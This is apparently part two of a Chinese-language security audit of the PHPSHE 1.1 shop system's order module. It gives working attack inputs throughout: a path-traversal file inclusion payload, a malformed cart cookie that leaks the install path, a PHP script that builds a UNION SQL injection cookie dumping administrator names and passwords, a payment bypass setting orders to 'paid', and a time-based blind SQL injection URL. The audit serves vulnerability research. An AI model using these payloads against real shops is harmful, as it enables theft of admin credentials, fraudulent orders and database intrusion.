### **PHPSHE V1.1 （二）**

**order.php**
接下來，我們來看看`order`購物車及訂單模塊。
<br >
大致看一下、購物車列表主要以序列化形式緩存在cookie裏面，第一反應就想到能不能有序列化注入？`選擇支付方式`似乎也存在包含漏洞。
<br >
先看看選擇`支付方式`的包含漏洞的

```php
//Line:106

case 'pay':
    ...
    if (isset($_p_pesubmit)) {
        ...
        include("{$pe['path_root']}include/plugin/payway/{$_p_info['order_payway']}/order_pay.php");
```

此處`$_p_info['order_payway']`可控且未經過濾。

### **【Bug 0x04: 任意文件包含漏洞 有限制條件】**
`POST:/index.php?mod=order&act=pay`
<br >
`DATA:info[order_payway]=../../../robots.txt%00?&pesubmit=1`
<br >
再看看，`訂單增加`操作無需登陸就可以對數據庫操作。

```php
//Line:65

case 'add':
    $cart_info = cart_info(unserialize($_c_cart_list));
```

跟進`cart_info()`函數

```php
//Line:135

function cart_info($_c_cart_list=array()) {
    ...
    else {
    if (is_array($_c_cart_list)) {
        foreach ($_c_cart_list as $k => $v) {
            $product_rows = $db->pe_select('product', array('product_id'=>$k), '`product_name`, `product_logo`, `product_smoney`, `product_num` as `product_maxnum`');
            $info_list[] = array_merge($v, $product_rows);
```

這個地方、除了可能有sql注入，同時還有一個亮點

`$info_list[] = array_merge($v, $product_rows);`

函數`array_merge()`錯誤的參數也會導致出現謝謝洩漏的。
<br >
我們任意構造一個錯誤的序列化訂單，例如`a:1:{s:0:"";a:1:{s:11:"product_num";N;}}`
<br >
這是通過空購物車的時候，進行**購物車商品更改數量**操作自動生成的一個錯誤的商品信息。
<br >
`/index.php?mod=order&act=cartnum`
<br >
然後再次進行任意一個調用到`cart_info()`函數的操作就會發生錯誤並返回錯誤信息。

### **【Bug 0x05: 信息洩露 爆路徑】**

URL:
```
/index.php?mod=order&act=cartnum
/index.php?mod=order&act=add
/index.php?mod=order&act=cartdel
```
**Cookie**:`cart_list=a:1:{s:0:"";a:1:{s:11:"product_num";N;}}`

```Warning: array_merge(): Argument #2 is not an array in E:\SourceCodes\phpshe1.1\module\index\order.php on line 148```

現在我們繼續審計是否存在注入。

```php
//Line:142

if (is_array($_c_cart_list)) {
    foreach ($_c_cart_list as $k => $v) {
        $product_rows = $db->pe_select('product', array('product_id'=>$k), '`product_name`, `product_logo`, `product_smoney`, `product_num` as `product_maxnum`');
```

`$k`存在注入。<br>
跟進`pe_select()`函數


```php
//Line:135

public function pe_select($table, $where = '', $field = '*')
    {
        //處理條件語句
        $sqlwhere = $this->_dowhere($where);
        return $this->sql_select("select {$field} from `".dbpre."{$table}` {$sqlwhere} limit 1");
```

再跟進`_dowhere()`函數


```php
//Line:181

//處理條件語句
protected function _dowhere($where)
{
    if (is_array($where)) 
    {
        foreach ($where as $k => $v) 
        {
            if (is_array($v)) 
            {
                $where_arr[] = "`{$k}` in('".implode("','", $v)."')";            
            }
            else 
            {
                in_array($k, array('order by', 'group by')) ? ($sqlby = " {$k} {$v}") : ($where_arr[] = "`{$k}` = '{$v}'");
            }
        }
        $sqlwhere = is_array($where_arr) ? 'where '.implode($where_arr, ' and ').$sqlby : $sqlby;
    }
    else 
    {
        $where && $sqlwhere = (stripos(trim($where), 'order by') === 0 or stripos(trim($where), 'group by') === 0) ? "{$where}" : "where 1 {$where}";
    }
    return $sqlwhere;
}
```

來自`$_c_cart_list`的`$k`未經過濾被帶入sql語句中，導致where條件注入。
<br >
這時，我們可以構造一個特殊的序列化購物車訂單，利用union任意查詢數據庫內容。
<br >
PHP_生成POC

```php
<?php
$b["'union select admin_name,2,3,4 from pe_admin -- -"][0] = '1\'';
$b["'union select admin_pw,2,3,4 from pe_admin -- -"][1] = '1\'';
$s = serialize($b);
print_r($s);
?>
```


### **【Bug 0x06: SQL注入 任意查詢】**

URL:`/index.php?mod=order&act=add`

Cookie:
<br>
```a:2:{s:49:"'union select admin_name,2,3,4 from pe_admin -- -";a:1:{i:0;s:2:"v'";}s:47:"'union select admin_pw,2,3,4 from pe_admin -- -";a:1:{i:1;s:2:"v'";}}```

兩個商品名稱處分別顯示管理員用戶名和密碼。
回到**訂單增加**操作。

```php
//Line:73-80

$_p_info['order_productmoney'] = $money['order_productmoney'];
$_p_info['order_wlmoney'] = $money['order_wlmoney'];
$_p_info['order_money'] = $money['order_money'];
$_p_info['order_atime'] = time();
$_p_info['user_id'] = $_s_user_id;
$_p_info['user_name'] = $_s_user_name;
$_p_info['user_address'] = "{$_p_province}{$_p_city}{$_p_info['user_address']}";
if ($order_id = $db->pe_insert('order', $_p_info)) {
```

我們用`print_r()`或者`var_dump()`輸出`$_p_info`

```php
Array
(
    [user_address] => 河南省鄭州市測試
    [user_tname] => 姓名
    [user_phone] => 13012345678
    [user_tel] =>
    [order_text] =>
    [order_productmoney] => 133.0
    [order_wlmoney] => 0.0
    [order_money] => 133.0
    [order_atime] => 1461044204
    [user_id] =>
    [user_name] =>
)
```

這時可以發現`user_tname`和`user_phone`和`user_tel`和`order_text`都沒有經過處理，就代入了sql查詢。
<br >
這裡、我們可以利用update注入了。當然，我們沒有登陸、無法查看到訂單詳情。
<br >
同時，我們也可以構造其他的參數例如`order_state`,直接修改訂單狀態。

### **【Bug 0x07: 支付繞過】**

URL:
```
/index.php?mod=order&act=add
```

DATA:
```
....
info[order_state]=paid
```

雖然會返回訂單號錯誤，但確實是成功了。
<br >
在登陸情況下，該頁面也存在不少注入漏洞。

```php
//Line:34

case 'cartnum':
    $money['order_productmoney'] = $money['order_wlmoney'] = $money['order_money'] = 0;
    if (pe_login('user')) {
        $result = $db->pe_update('cart', array('user_id'=>$_s_user_id, 'product_id'=>$_g_product_id), array('product_num'=>$_g_product_num));
    }
```

`$_g_product_id`和`$_g_product_num`未經顧慮就帶入了sql更新。
<br >

### **【Bug 0x08: SQL注入 Update注入 AND/OR time-based blind 登陸限制】**

URL:

```/index.php?mod=order&act=cartnum&product_id=1&product_num=12' AND (SELECT * FROM (SELECT(SLEEP(5)))YfCN) AND 'RShN'='RShN```